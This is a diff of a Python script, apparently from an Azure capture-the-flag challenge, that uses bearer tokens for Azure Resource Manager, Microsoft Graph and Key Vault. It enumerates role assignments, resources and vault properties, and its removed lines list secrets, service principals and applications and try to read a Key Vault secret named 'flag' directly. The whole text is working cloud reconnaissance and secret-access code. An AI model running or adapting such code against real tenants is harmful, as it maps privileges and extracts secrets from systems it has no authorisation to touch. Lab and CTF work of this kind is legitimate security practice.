@@ -57,30 +57,24 @@ def q(u, tok, m="GET"):
     return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)
 
 FLAG = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets/flag" % SUB
-s, b = q("https://management.azure.com%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % FLAG, ARM)
-print("FLAG_RA", s, b[:6000])
+VAULTRES = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz" % SUB
+for scope_name, scope in [("flag", FLAG), ("vault", VAULTRES), ("rg", "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea" % SUB)]:
+    s, b = q("https://management.azure.com%s/providers/Microsoft.Authorization/roleAssignments?$filter=atScope()&api-version=2022-04-01" % scope, ARM)
+    try:
+        for ra in json.loads(b).get("value", []):
+            p = ra["properties"]
+            print("RA", scope_name, p["principalId"], p["roleDefinitionId"].split("/")[-1], p["principalType"])
+    except Exception:
+        print("RA_ERR", scope_name, s, b[:300])
 
-s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" % SUB, ARM)
-print("SEC_SECRETS", s, b[:3000])
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" % SUB, ARM)
+try:
+    for r in json.loads(b).get("value", []):
+        print("RES", r["type"], r["name"])
+except Exception:
+    print("RES_ERR", s, b[:500])
 
-s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups?api-version=2022-09-01" % SUB, ARM)
-print("RGS", s, [g.get("name") for g in json.loads(b).get("value", [])] if s == 200 else b[:300])
-
-s, b = q("https://graph.microsoft.com/v1.0/servicePrincipals?$select=id,appId,displayName&$top=200", GRAPH)
-if s == 200:
-    for sp in json.loads(b).get("value", []):
-        print("SP", sp.get("displayName"), sp.get("appId"), sp.get("id"))
-else:
-    print("SPS_ERR", s, b[:300])
-
-s, b = q("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=200", GRAPH)
-if s == 200:
-    for sp in json.loads(b).get("value", []):
-        print("APP", sp.get("displayName"), sp.get("appId"), sp.get("id"))
-else:
-    print("APPS_ERR", s, b[:300])
-
-s, b = ex("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", headers={"Authorization": "Bearer " + VAULT})
-print("CI_FLAG_TRY", s, b[:300])
+s, b = q("https://management.azure.com%s?api-version=2023-07-01" % VAULTRES, ARM)
+print("VAULT_PROPS", s, b[:2000])
 print("===Q_END===")
 PY
